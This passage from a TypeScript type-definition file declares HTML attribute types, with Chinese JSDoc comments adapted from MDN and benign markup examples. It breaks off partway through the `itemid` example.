import type { Properties as CssProperties } from 'csstype'

type BoolType = 'true' | 'false' | boolean

/**
 * AutoComplete的可选值列表，只预设了部分值
 *
 * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/autocomplete 具体请看文档
 */
type AutoComplete =
  | 'off'
  | 'on'
  | 'email'
  | 'username'
  | 'new-password'
  | 'current-password'
  | 'one-time-code'
  | 'organization-title'
  | 'organization'
  | 'street-address'
  | 'country'
  | 'sex'
  | 'url'
  | 'photo'
  | 'language'
  | 'bday'
  | 'bday-day'
  | string

/**
 * 自定义数据属性
 */
export interface CustomProperties {
  /**
   * class全局属性接受字符串、数组和`Record<string, boolean>`类型的对象。
   *
   * 当为对象时`Key`为类名，`Value`为是否添加该类名的布尔值。
   *
   * ```jsx
   * // 键值对对象类型
   * <div class={{ active: true, hidden: false,'my-class': true }} />
   * // 数组类型
   * <div class={['active', 'my-class']} />
   * // `W3C`标准语法
   * <div class="active my-class" />
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/class
   */
  class?: string | string[] | Record<string, boolean>

  /**
   * data-* 全局属性 是一类被称为自定义数据属性的属性，
   *
   * 它赋予我们在所有 HTML 元素上嵌入自定义数据属性的能力，
   *
   * 并可以通过脚本在 HTML 与 DOM 表现之间进行专有数据的交换。
   *
   * 命名规范：
   *  - 该名称不能以xml开头，无论这些字母是大写还是小写；
   *  - 该名称不能包含任何分号 (U+003A)；
   *  - 该名称不能包含 A 至 Z 的大写字母。
   *
   * 用法
   *
   * 通过添加 data-* 属性，即使是普通的 HTML 元素也能变成相当复杂且强大的编程对象。
   * 例如，在游戏里的太空船 "sprite" 可以是一个带有一个 class 属性和几个 data-* 属性的简单 img 元素：
   *
   * ```html
   * <img class="spaceship cruiserX3" src="shipX3.png"
   *   data-ship-id="324" data-weapons="laserI laserII" data-shields="72%"
   *   data-x="414354" data-y="85160" data-z="31940"
   *   onclick="spaceships[this.dataset.shipId].blasted()">
   * </img>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/data-*
   */
  [key: `data-${string}`]: string

  [key: string]: any
}

/**
 * 局部属性
 */
interface PartProperties {
  /**
   * ## `accept` 属性的值是一个以逗号分隔的列表，其中包含一个或多个文件类型/{@link https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/accept#%E5%94%AF%E4%B8%80%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%A0%87%E8%AF%86%E7%AC%A6|唯一文件类型标识符}（描述了允许的文件类型）。
   *
   * `accept` 是 `file <input>` 类型的属性。`<form>` 元素曾经支持这个属性，但已被移除，改用 `file`。
   *
   * 由于一种给定的文件类型可以用多种方式标识，因此在需要特定类型的文件时，提供一套完整的类型说明是非常有用的，
   * 或者使用通配符来表示任何格式的类型也是可以接受的。
   *
   * 例如，有多种方法可以标识 Microsoft Word 文件，因此接受 Word 文件的网站可能会使用像这样的 `<input>`：
   *
   * ```html
   * <form method="post" enctype="multipart/form-data">
   *   <div>
   *     <label for="file">选择要上传的文件</label
   *     ><input type="file" id="file" name="file" multiple />
   *   </div>
   *   <div>
   *     <button>提交</button>
   *   </div>
   * </form>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/accept 完整的文档
   */
  accept?: string
  /**
   * HTML `autocomplete` 属性允许 web 开发人员指定用户代理是否有权限在填写表单字段值时提供自动帮助，
   * 并指导浏览器填写该字段的预期信息类型。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/autocomplete 完整的文档
   */
  autocomplete?: AutoComplete
  /**
   * `capture` 属性可选地指定应捕获一个新文件，以及应使用哪个设备捕获 `accept` 属性所定义类型的新媒体。
   *
   * 可用值包括 `user` 和 `environment`，该属性支持 `file` 输入类型。
   *
   * 如果 `accept` 属性指示输入应为图像或视频数据类型之一，则 `capture` 属性的值为一个字符串，用于指定使用哪个摄像头捕获图像或视频数据。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/capture 完整的文档
   */
  capture?: 'user' | 'environment'
  /**
   * `crossorigin` 属性在 `<audio>`、`<img>`、`<link>`、`<script>` 和 `<video>` 元素中有效，它们提供对 CORS 的支持，定义该元素如何处理跨源请求，从而实现对该元素获取数据的 CORS 请求的配置。根据元素的不同，该属性可以是一个 CORS 设置属性。
   *
   * 在媒体元素上所使用的 `crossorigin` 内容属性为 CORS 设置属性。
   *
   * 这些属性是枚举的，并具有以下可能的值：
   *
   *  - `anonymous`：请求使用了 CORS 标头，且证书标志被设置为 'same-origin'。
   *  没有通过 cookies、客户端 SSL 证书或 HTTP 认证交换用户凭据，除非目的地是同一来源。
   *  - `use-credentials`：请求使用了 CORS 标头，且证书标志被设置为 'include'。
   *  - `''`：将属性名称设置为空值，如 crossorigin 或 crossorigin=""，与设置为 anonymous 的效果一样。
   *
   * 不合法的关键字或空字符串会视为 `anonymous` 关键字。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/crossorigin 完整的文档
   */
  crossorigin?: 'anonymous' | 'use-credentials' | string
  /**
   * ## HTML attribute: dirname
   *
   * `<textarea>`元素和几种`<input>`类型可以使用`dirname`属性，该属性在表单提交时描述元素文本内容的方向性。
   * 浏览器使用此属性的值来确定用户输入的文本是从左到右还是从右到左。
   * 当使用时，元素的文本方向性值将与`dirname`属性的值（作为字段的名称）一起包含在表单提交数据中。
   *
   * @see https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/dirname 完整的文档
   */
  dirname?: string
  /**
   * ## HTML 属性：disabled
   *
   * 当布尔属性 disabled 存在时，元素将不可变、不能聚焦或与表单一同提交。
   * 用户将不能在表单控件本身或其子控件进行编辑或聚焦操作。
   *
   * 如果在表单控件上指定了 disabled 属性，则该元素及其子控件不参与约束验证。
   * 通常浏览器会将它们打灰处理，它不会收到任何浏览事件，如鼠标点击或与焦点相关的事件。
   *
   * 这些元素支持 disabled 属性：`<button>`、`<fieldset>`、`<optgroup>`、`<option>`、`<select>`、`<textarea>` 和 `<input>`。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/disabled 完整的文档
   */
  disabled?: boolean
  /**
   * ## HTML 属性：`elementtiming`
   *
   * `elementtiming` 属性用于指示使用 “element” 类型的 {@link https://developer.mozilla.org/en-US/docs/Web/API/PerformanceObserver |`PerformanceObserver`} 对象将元素标记为要跟踪。
   * 有关更多详细信息，请参阅 {@link https://developer.mozilla.org/en-US/docs/Web/API/PerformanceElementTiming |`PerformanceElementTiming`} 接口。
   *
   * 此属性可应用于 `<img>`、`<svg>` 内的 `<image>` 元素、`<video>` 元素的海报图像、具有背景图像的元素以及包含文本节点的元素，如`<p>`。
   *
   * @see https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/elementtiming 完整的文档
   */
  elementTiming?: string
  /**
   * HTML 属性：`for`
   *
   * `for` 属性是 `<label>` 和 `<output>` 允许使用的属性。
   * 当用于 `<label>` 元素时，它表示该标签所描述的表单元素。
   * 当用于 `<output>` 元素时，它允许在代表输出中使用的值的元素之间建立明确的关系。
   *
   * ## 使用说明
   *
   * 当作为 `<label>` 的属性使用时，`for` 属性的值是与之相关的表单元素的id。
   *
   * ```html
   * <label for="username">你的名字</label> <input type="text" id="username" />
   * ```
   * 作为 `<output>` 的属性使用时，`for` 属性的值是一个空格分隔的列表，其中包含用于创建输出的元素的 `id` 值。
   *
   * ```html
   * <input type="range" id="b" name="b" value="50" /> +
   * <input type="number" id="a" name="a" value="10" /> =
   * <output name="result" for="a b">60</output>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/for 完整的文档
   */
  for?: string
  /**
   * HTML 属性：max
   *
   * `max` 属性定义包含该属性的输入可接受且有效的最大值。
   * 如果元素的值大于此值，则元素未通过验证。此值必须大于或等于 `min` 属性的值。
   * 如果 `max` 属性存在但未指定或无效，则不会应用 `max` 值。
   * 如果 `max` 属性有效且非空值大于 `max` 属性允许的最大值，则约束验证将阻止表单提交。
   *
   * max 属性对数字输入类型有效，包括日期、月份、周、时间、本地日期时间、数字和范围类型，以及 `<progress>` 和 `<meter>` 元素。
   * 它是一个数字，用于指定表单控件被视为有效的最正值。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/max 完整的文档
   */
  max?: string | number
  /**
   * HTML 属性：maxlength
   *
   * `maxlength` 属性定义了包含该属性的元素可以包含的最大字符数。
   *
   * 如果元素包含的字符数超过 `maxlength` 属性指定的值，则元素未通过验证。
   *
   * `maxlength` 属性对 `<textarea>` 和 `<input>` 元素有效。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/maxlength 完整的文档
   */
  maxlength?: number | string
  /**
   * HTML 属性：`min`
   *
   * `min` 属性定义包含该属性的输入可接受且有效的最小值。
   *
   * 如果元素的值小于此值，则元素未通过验证。此值必须小于或等于 `max` 属性的值。
   *
   * 如果 `min` 属性存在但未指定或无效，则不会应用 `min` 值。
   *
   * 如果 `min` 属性有效且非空值小于 `min` 属性允许的最小值，则约束验证将阻止表单提交。
   *
   * `min` 属性对数字输入类型有效，包括日期、月份、周、时间、本地日期时间、数字和范围类型，以及 `<progress>` 和 `<meter>` 元素。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/min 完整的文档
   */
  min?: string | number
  /**
   * HTML 属性：`multiple`
   *
   * 如果设置了布尔属性 `multiple`，则意味着表单控件将接受一个及以上的值。
   * 该属性对 `email` 和 `file` 输入类型以及 `<select>` 元素有效。用户选择多个值的方式取决于表单控件。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/multiple 完整的文档
   */
  multiple?: boolean
  /**
   * ## HTML 属性：`pattern`
   *
   * `pattern` 属性规定了一个表单控件的值应该匹配的正则表达式。
   * 如果一个非 `null` 值不满足 `pattern` 值设置的约束，`ValidityState` 对象的只读属性 `patternMismatch` 将为 `true`。
   *
   * ## 概述
   * `pattern` 属性是 `text`、`tel`、`email`、`url`、`password` 和 `search` 等输入类型的属性。
   *
   * 当指定 `pattern` 属性时，它是一个正则表达式，代表输入的 `value` 必须与之匹配，以便该值能够通过约束验证。
   * 它必须是一个有效的 `JavaScript` 正则表达式，它会被 `RegExp` 类型所使用，正如我们的正则表达式指南中所述；在编译正则表达式时指定 'u' 标志，以便将该模式作为 `Unicode` 码点序列，而不是 `ASCII`。模式文本周围不应指定正斜杠。
   *
   * `pattern` 属性对 `<textarea>` 和 `<input>` 元素有效。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/pattern 完整的文档
   */
  pattern?: string
  /**
   * HTML 属性：`placeholder`
   *
   * `placeholder` 属性定义了当表单控件没有值时在控件中显示的文本。占位符文本应简要提示用户应向控件输入的预期数据类型。
   *
   * 有效的占位符文本包括暗示预期数据类型的单词或短语，而不是解释或提示。不得使用占位符代替 `<label>`。
   * 如果表单控件的值不是空，占位符就不可见，因此使用 `placeholder` 而不是 `<label>` 来提示会损害可用性和无障碍性。
   *
   * 以下输入类型支持 `placeholder` 属性：`text`、`search`、`url`、`tel`、`email` 和 `password`。`<textarea>` 元素也支持该功能。下面的示例显示了 `placeholder` 属性的使用情况，以解释输入字段的预期格式。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/placeholder 完整的文档
   */
  placeholder?: string
  /**
   * HTML 属性：`readonly`
   *
   * 当 `readonly` 布尔属性存在时，元素是不可变的，意味着用户无法编辑控件。
   *
   * ## 概述
   * 如果在 `input` 元素上指定了 `readonly` 属性，由于用户无法编辑输入内容，因此该元素不参与约束验证。
   *
   * `text`、`search`、`url`、`tel`、`email`、`password`、`date`、`month`、`week`、`time`、`datetime-local`、`number` 这些 `<input>` 类型和 `<textarea>` 表单控件元素均支持 `readonly` 属性。
   * 如果这些输入类型和元素中存在这个属性，则匹配 `:read-only` 伪类。如果不包含该属性，则将匹配 `:read-write` 伪类。
   *
   * 该属性不支持 `<select>` 或已不可变的 `input` 类型，
   * 也与之无关，如 `checkbox`、`radio` 或根据定义不能以值开头的 `input` 类型，如 `file` input 类型。
   * `range` 和 `color` 都有默认值。`hidden` input 类型也不支持该属性，因为用户不可能填写隐藏的表单。
   * 也不支持任何按钮类型，包括 image。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/readonly 完整的文档
   */
  readonly?: boolean
  /**
   * ## HTML 属性：`rel`
   *
   * `rel` 属性定义了所链接的资源与当前文档的关系，在 `<a>`、`<area>` 和 `<link>` 元素上有效。支持的值取决于拥有该属性的元素。
   *
   * 关系的类型是由 `rel` 属性的值给出的，如果存在的话，它的值必须是一组无序的、唯一的、用空格隔开的关键字。
   * 与不表达语义的 class 名称不同，rel 属性必须使用对机器和人类都有语义的标记。
   * 目前关于 rel 属性的可能值的注册表是 IANA 链接关系注册表、HTML 现行标准和 microformats wiki 中可自由编辑的
   * existing-rel-values 页面（根据现行标准的建议）。
   * 如果使用一个不存在于上述三个来源之一的 rel 属性，一些 HTML 验证器（如 W3C Markup Validation Service）会产生一个警告。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/rel 完整的文档
   */
  rel?: string
  /**
   * HTML 属性：required
   *
   * `required` 布尔属性（如果存在）表示用户在提交输入所属的表单前必须为其指定一个值。
   *
   * `text`、`search`、`url`、`tel`、`email`、`password`、`date`、`month`、`week`、`time`、`datetime-local`、`number`、`checkbox`、`radio`、`file` `<input>` 类型以及 `<select>` 和 `<textarea>` 表单控件元素均支持 `required` 属性。
   * 如果这些输入类型和元素中出现了该属性，则会匹配 `:required` 伪类。如果不包含该属性，则会匹配 `:optional` 伪类。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/required 完整的文档
   */
  required?: boolean
  /**
   * HTML 属性：size
   *
   * `size` 属性定义了 `<input>` 元素的宽度和 `<select>` 元素的高度。对于 `input`，如果 `type` 属性是 `text` 或 `password` ，那么它就是字符数。
   *  字符数必须是 0 或更大的整数。如果没有指定 `size`，或指定的值无效，则不会声明输入的大小，表单控件将采用基于用户代理的默认宽度。如果 CSS 目标元素的属性会影响宽度，则 CSS 优先。
   *
   * ##示例
   * 通过在某些输入类型上添加 `size` 可以控制输入的宽度。在选择项上添加 `size` 会改变高度，从而定义在关闭状态下有多少选项是可见的。
   *
   * ```html
   * <label for="fruit">选择一种水果</label>
   * <input type="text" size="15" id="fruit" />
   * <label for="vegetable">选择一种蔬菜</label>
   * <input type="text" id="vegetable" />
   *
   * <select name="fruits" size="5">
   *   <option>香蕉</option>
   *   <option>樱桃</option>
   *   <option>草莓</option>
   *   <option>榴莲</option>
   *   <option>蓝莓</option>
   * </select>
   *
   * <select name="vegetables" size="5">
   *   <option>胡萝卜</option>
   *   <option>黄瓜</option>
   *   <option>菜花</option>
   *   <option>芹菜</option>
   *   <option>油麦菜</option>
   * </select>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/size 完整的文档
   */
  size?: number | string
  /**
   * HTML 属性：step
   *
   * `step` 属性是一个数字，用于指定值必须遵循的粒度或关键字 any。
   * 它对数字输入类型有效，包括日期、月、周、时间、本地日期时间、数字和范围类型。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Attributes/step 完整的文档
   */
  step?: number | string
}

/**
 * 全局属性
 */
export interface OverwriteHtmlProperties extends PartProperties {
  /**
   * 全局属性 `style` 包含应用到元素的 CSS 样式声明。
   * 要注意样式最好定义在单独的文件中。
   * 这个属性以及 `<style>` 元素的主要目的是快速装饰。例如用于测试目的。
   *
   * > **备注**：这个属性不能用于传递语义信息。即使所有样式都移除了，页面也应该保留正确语义。
   * 通常它不应用于隐藏不相关的信息；这应该使用 `hidden` 属性来实现。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/style 完整的使用文档
   */
  style?: string | CssProperties | Partial<CSSStyleDeclaration>
  /**
   * accesskey全局属性，提供了为当前元素生成快捷键的方式。
   *
   * 属性值必须包含一个可打印字符
   *
   * 示例：
   * ```html
   * <button accesskey="s">Stress reliever</button>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/accesskey
   */
  accesskey?: string
  /**
   * anchor全局属性用于将定位元素与 anchor 元素相关联。
   *
   * 该属性的值是要将定位元素锚定到的元素的 id 值。
   *
   * 然后，可以使用 CSS 锚点定位来定位元素。
   *
   * > 实用性功能，暂不推荐使用
   *
   * @see https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/anchor
   */
  anchor?: string
  /**
   * autocapitalize 全局属性 是一个枚举属性，它控制用户输入/编辑文本输入时文本输入是否自动大写，以及如何自动大写。
   *
   * 属性必须取下列值之一：
   *
   *  1. `off` or `none`: 没有应用自动大写（所有字母都默认为小写字母）。
   *  2. `on` or `sentences`: 每个句子的第一个字母默认为大写字母；所有其他字母都默认为小写字母。
   *  3. `words`: 每个单词的第一个字母默认为大写字母；所有其他字母都默认为小写字母。
   *  4. `characters`: 所有的字母都默认为大写。
   *
   * 在物理键盘上输入时，autocapitalize 属性不会影响行为。
   *
   * 相反，它会影响其他输入机制的行为，比如移动设备的虚拟键盘和语音输入。
   *
   * 这种机制的行为是，它们经常通过自动地将第一个句子的字母大写来帮助用户。
   *
   * autocapitalize 属性使作者能够覆盖每个元素的行为。
   *
   * autocapitalize 属性永远不会为带有 type 属性，其值为 url、email 或 password 的 <input> 元素启用自动大写。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/autocapitalize
   */
  autocapitalize?: 'off' | 'none' | 'on' | 'sentences' | 'words' | 'characters'
  /**
   * autofocus 全局属性 是一个布尔属性，表示元素应在页面加载时或其所属的 <dialog> 显示时被聚焦。
   *
   * 示例：
   *
   * ```html
   * <input name="q" autofocus />
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/autofocus
   */
  autofocus?: boolean
  /**
   * contenteditable 全局属性 是一个枚举属性，它控制元素是否可编辑。
   *
   * 如果可以，浏览器会修改元素的组件以允许编辑。
   *
   * 示例：
   *
   * ```html
   * <div contenteditable="true">This text is editable</div>
   *
   * <blockquote contenteditable="true">
   *   <p>Edit this content to add your own quote</p>
   * </blockquote>
   *
   * <cite contenteditable="true">-- Write your own name here</cite>
   * ```
   *
   * 该属性必须是下面的值之一：
   *  - `true`: 允许编辑。
   *  - `false`: 禁止编辑。
   *  - `plaintext-only`: 表示元素的原始文本是可编辑的，但富文本格式会被禁用。
   *
   * 如果没有设置该属性的值（例如：`<label contenteditable>Example Label</label>`），则其值被视为空字符串。
   *
   * 如果没给出该属性或设置了无效的属性值，则其默认值继承自父元素：即，如果父元素可编辑，该子元素也可编辑。
   *
   * **注意**，虽然该属性允许设定的值包括 `true` 和 `false`，但该属性仍是一个枚举属性而非布尔属性。
   *
   * 你可以使用 CSS `caret-color` 属性设置用于绘制文本插入 `caret` 的颜色。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/contenteditable
   */
  contentEditable?: BoolType | 'plaintext-only'
  /**
   * 全局属性dir是一个指示元素中文本方向的枚举属性。
   *
   * 它的取值如下：
   *  - `auto`: 指由用户代理决定方向。它在解析元素中字符时会运用一个基本算法，
   *  直到发现一个具有强方向性的字符，然后将这一方向应用于整个元素。
   *  - `rtl`: 指从右到左，用于那种从右向左书写的语言（比如阿拉伯语）；
   *  - `ltr`: 指从左到右，用于那种从左向右书写的语言（比如英语）；
   *
   * 备注：这个属性对有不同语义的<bdo>元素是必须的。
   *  - 这个属性在<bdi>元素中不可继承。未赋值时，它的默认值是 `auto`。
   *  - 这个属性可以被 CSS 属性`direction`和`unicode-bidi`覆盖，如果 CSS 网页有效且该元素支持这些属性的话。
   *  - 由于文本的方向是和内容的语义而不是和表现相关，因此有可能的话，网页开发者使用这一属性而非 CSS 属性是被推荐的。这样，即使在不支持 CSS 或禁用 CSS 的浏览器中，文本也会正常显示。
   *  - `auto` 应当用于方向未知的数据，如用户输入的数据，最终保存在数据库中的数据。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/dir
   */
  dir?: 'auto' | 'ltr' | 'rtl'
  /**
   * 全局属性 `draggable` 是一种枚举属性，用于标识元素是否允许使用浏览器原生行为或 HTML 拖放操作 API 拖动。
   *
   * `draggable` 属性可以应用于严格属于 HTML 命名空间的元素，这意味着它不能应用于 SVG。
   *
   * 关于命名空间声明的简介和作用的更多信息，请参阅命名空间速成课。
   *
   * `draggable` 可以有如下取值：
   *   - `true`: 允许元素被拖动。
   *   - `false`: 禁止元素被拖动。
   *
   *  @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/draggable
   */
  draggable?: BoolType
  /**
   * 全局属性`enterkeyhint`是一个枚举属性，用于定义要为虚拟键盘上的 Enter 键显示的操作标签（或图标）。
   *
   * 表单控件(如<textarea>或<input>元素)或使用`contenteditable`的元素可以指定`inputmode`属性，以控制将使用哪种虚拟键盘。
   *
   * 为了进一步提高用户体验，可以通过提供`enterkeyhint`属性来专门定制Enter键，该属性指示应如何标记Enter键(或应显示哪个图标)。
   *
   * Enter键通常表示用户应执行的操作，典型操作是:发送文本、插入新行或搜索。
   *
   * 如果未提供 `enterkeyhint` 属性，则用户代理可能会使用 `inputmode`、`type` 或 `pattern` 属性中的上下文信息来显示合适的 `enter` 键标签（或 icon）。
   *
   * 值：
   *   - `enter`: 通常插入新行。
   *   - `done`: 通常意味着没有更多内容需要输入，并且输入法编辑器 （IME） 将关闭。
   *   - `go`: 通常表示将用户带到他们键入的文本的目标。
   *   - `next`: 通常将用户带到下一个将接受文本的字段。
   *   - `previous`: 通常将用户带到将接受文本的上一个字段。
   *   - `search`: 通常将用户带到搜索他们键入的文本的结果。
   *   - `send`: 通常将文本传送到其目标。
   *
   * @see https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/enterkeyhint
   */
  enterKeyHint?: 'enter' | 'done' | 'go' | 'next' | 'previous' | 'search' | 'send'
  /**
   * 全局属性 hidden 是一个布尔属性，表示一个元素尚未或者不再相关。
   *
   * 例如，它可以被用来隐藏一个页面元素直到登录完毕。
   *
   * 如果一个元素设置了这个属性，它就不会被显示。
   *
   * 该`hidden`属性用于指示不应向用户显示元素的内容。
   *
   * 此属性可以采用以下任一值：
   *  - 空字符串
   *  - hidden
   *  - until-found
   *
   * 有两种状态与该 hidden 属性相关联： 隐藏状态和隐藏直到找到 状态。
   *
   * 空字符串或`hidden`将元素设置为 hidden 状态,此外，无效值会将元素设置为 hidden 状态。
   *
   * `until-found` 将元素设置为 hidden until found 状态。
   *
   * 因此，以下所有操作都将元素设置为 hidden   状态：
   * ```html
   * <span hidden>I'm hidden</ span>
   * <span hidden="">I'm also hidden</ span>
   * <span hidden="hidden">I'm hidden too!</ span>
   * ```
   * 下面将元素设置为 hidden until found 状态：
   * ```html
   * <span hidden="until-found">I'm hidden until found</ span>
   * ```
   *
   * 该 hidden 属性不能仅用于隐藏一个演示文稿中的内容。
   *
   * 如果某项内容被标记为隐藏，则所有演示文稿（包括屏幕阅读器）都会隐藏该内容。
   *
   * 隐藏元素不应与非隐藏元素链接,例如，使用 href attribute 链接到标有 attribute 的 hidden 章节是不正确的,
   * 如果内容不适用或不相关，则没有理由链接到它。
   *
   * 但是，使用 ARIA `aria-describedby` 属性来引用本身隐藏的描述是可以的。
   *
   * 虽然隐藏描述意味着它们本身没有用，但它们的编写方式可以是这样，即它们在从它们描述的元素引用的特定上下文中很有用。
   *
   * 同样具有该 `hidden` 属性的 `canvas` 元素可以被脚本化图形引擎用作屏幕外缓冲区，并且表单控件可以使用其 form 属性引用隐藏的表单元素。
   *
   * 作为隐藏元素的后代的元素仍处于活动状态，这意味着脚本元素仍可执行，表单元素仍可提交。
   *
   * 受支持的场合:
   * Chrome 10、Chrome Android、Edge、Firefox 4、Opera 15、Safari 5.1、Safari iOS 5
   * 作者 ：Mozilla 贡献者  ， CC BY-SA 2.5
   * developer. mozilla. org 的 `hidden`
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/hidden
   */
  hidden?: '' | 'hidden' | 'until-found'
  /**
   * 全局属性`id`定义了一个全文档唯一的标识符（ID）。
   *
   * `id` 的值不得包含空格和制表符等空白字符。
   *
   * 浏览器会将不符合规范的 `ID` 中的空白字符视为 `ID` 的一部分。
   *
   * 与允许以空格分隔值的 class 属性不同，元素只能拥有一个 `id` 值。
   *
   * > **备注**：从技术上讲，`id` 属性的值可以包含除了空白字符的任何字符。
   * 然而，为了避免无意中的错误，只能使用 ASCII 字母、数字、'_' 和 '-'，并且id 属性的值应该以字母开头。
   * 例如，. 在 CSS 中具有特殊的意义（它作为一个类选择器）。
   * 除非你注意在 CSS 中转义它，否则它不会被识别为 id 属性值的一部分。
   * 很容易忘记这样做，导致你的代码中出现难以检测的错误。
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/id
   */
  id?: string
  /**
   * 全局属性`inert`是一个 Boolean 属性，指示浏览器将忽略该元素。
   *
   * 使用 该 inert attribute，元素的所有不逃避惰性的 flat tree 后代（例如模态 <dialog>  s）都将被忽略。
   *
   * 该inert属性还使浏览器忽略用户发送的输入事件，包括与焦点相关的事件和来自辅助技术的事件。
   * 具体而言，`inert` 执行以下操作：
   *  - 防止 `click` 在用户单击元素时触发事件。
   *  - 通过阻止元素获得焦点来防止 `focus` 引发事件。
   *  - 通过将元素及其内容从辅助功能树中排除，使其对辅助技术隐藏。
   *
   * 示例：
   * ```
   * <body inert> <!-- content --> </ body>
   * ```
   * 可以将该 `inert` 属性添加到不应具有交互性的内容部分。
   *
   * 当元素处于惰性状态时，它以及元素的所有后代（包括通常的交互式元素，如链接、按钮和表单控件）都将被禁用，
   * 因为它们无法接收焦点或无法单击。
   *
   * 该 inert 属性也可以添加到应该在屏幕外或隐藏的元素中。惰性元素及其后代将从 Tab 键顺序和辅助功能树中删除。
   *
   * > *注意*： `inert` 是一个全局属性，可以应用于任何元素，它通常用于内容部分。
   * 要使单个控件“惰性”，请考虑改用 `disabled`、`attribute` 和 CSS `:disabled`样式。
   *
   * 受支持的场合:
   * Chrome 102、Chrome Android 102、Edge 102、Firefox 112、Opera 88、Safari 15.5、Safari iOS 15.5
   *
   * 作者 ：Mozilla 贡献者  ， CC BY-SA 2.5
   * developer. mozilla. org 的 `inert`
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/inert
   */
  inert?: boolean
  /**
   * 全局属性`inputmode`是一个枚举属性，它提供了用户在编辑元素或其内容时可能输入的数据类型的提示。
   *
   * 它可以是以下值：
   *  - none：无虚拟键盘。在应用程序或者站点需要实现自己的键盘输入控件时很有用。
   *  - text：使用用户本地区域设置的标准文本输入键盘。
   *  - decimal：小数输入键盘，包含数字和分隔符（通常是“ . ”或者“ , ”），设备可能也可能不显示减号键。
   *  - numeric：数字输入键盘，所需要的就是 0 到 9 的数字，设备可能也可能不显示减号键。
   *  - tel：电话输入键盘，包含 0 到 9 的数字、星号（*）和井号（#）键。表单输入里面的电话输入通常应该使用 `<input type="tel">`。
   *  - search：为搜索输入优化的虚拟键盘，比如，返回键可能被重新标记为“搜索”，也可能还有其他的优化。
   *  - email：为邮件地址输入优化的虚拟键盘，通常包含"@"符号和其他优化。表单里面的邮件地址输入应该使用`<input type="email">`。
   *  - url：为网址输入优化的虚拟键盘，比如，“/”键会更加明显、历史记录访问等。表单里面的网址输入通常应该使用 `<input type="url">`。
   *
   *  如果没有设置这个属性，它的默认值是 `text`，表明使用本地的标准文本输入键盘。
   */
  inputMode?: 'none' | 'text' | 'decimal' | 'numeric' | 'tel' | 'search' | 'email' | 'url'
  /**
   * 全局属性`is`允许你指定标准 HTML 元素像定义的内置元素一样工作（请参阅使用{@link https://developer.mozilla.org/zh-CN/docs/Web/API/Web_components/Using_custom_elements|自定义元素}以获取更多详细信息）。
   *
   * 只有在当前文档中已成功定义 ( {@link https://developer.mozilla.org/zh-CN/docs/Web/API/CustomElementRegistry/define|defined} ) 指定的自定义元素名称并且扩展了要应用的元素类型时，才能使用此属性。
   *
   * 示例:
   *
   * 以下代码来自我们的 {@link https://github.com/mdn/web-components-examples/tree/master/word-count-web-component|word-count-web-component} 示例（{@link https://mdn.github.io/web-components-examples/word-count-web-component/|see it live also}）。
   *
   * ```js
   * // Create a class for the element
   * class WordCount extends HTMLParagraphElement {
   *   constructor() {
   *     // Always call super first in constructor
   *     super();
   *
   *     // Constructor contents ommitted for brevity
   *     ...
   *
   *   }
   * }
   *
   * // Define the new element
   * customElements.define('word-count', WordCount, { extends: 'p' });
   * ```
   * ```html
   * <p is="word-count"></p>
   * ```
   *
   * @see https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/is
   */
  is?: string
  /**
   * 全局属性 `itemid` 是元素的唯一的全局标识符。
   * `itemid` 属性只能为同时拥有 `itemscope` 和 `itemtype` 的元素指定。
   * 同时，`itemid` 只能为拥有 `itemscope` 的元素指定，它的相应 `itemtype` 引用或定义了支持全局标识符的词汇。
   *
   * `itemtype` 的全局标识符的准确含义，由该标识符以指定的词汇提供。词汇定义了全局标识符相同的多个元素是否可以共存，并且如果是这样，这些元素如何处理。
   *
   * > **注**：Whatwg.org 的定义规定了 `itemid` 必须是 URL。但是，下面的示例正确展示了 URN 也可以使用。
   * 这个不一致性可能反映了 Microdata 规范的不完善性。
   *
   * 示例：
   *
   * ```html
   * <dl
   *   itemscope
   *   itemtype="http://vocab.example.net/book"
